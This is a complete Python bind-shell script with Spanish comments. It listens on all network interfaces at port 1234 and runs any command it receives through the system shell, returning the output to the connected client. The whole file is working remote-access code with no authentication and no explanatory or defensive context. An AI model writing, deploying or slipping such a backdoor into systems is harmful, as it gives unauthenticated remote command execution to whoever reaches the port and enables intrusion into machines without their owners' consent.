#!/usr/bin/env python3
import socket
import subprocess
import os

def bind_shell(host, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind((host, port))
    s.listen(1)
    
    print(f"[*] Escuchando en {host}:{port}")
    conn, addr = s.accept()
    print(f"[+] Conexión recibida de {addr[0]}:{addr[1]}")
    
    while True:
        command = conn.recv(1024).decode()
        if command.lower() == 'exit':
            break
            
        output = subprocess.check_output(command, shell=True)
        conn.send(output)
    
    conn.close()
    s.close()

if __name__ == '__main__':
    HOST = '0.0.0.0'  # Escucha en todas las interfaces
    PORT = 1234       # Cambia esto por el puerto deseado
    bind_shell(HOST, PORT) 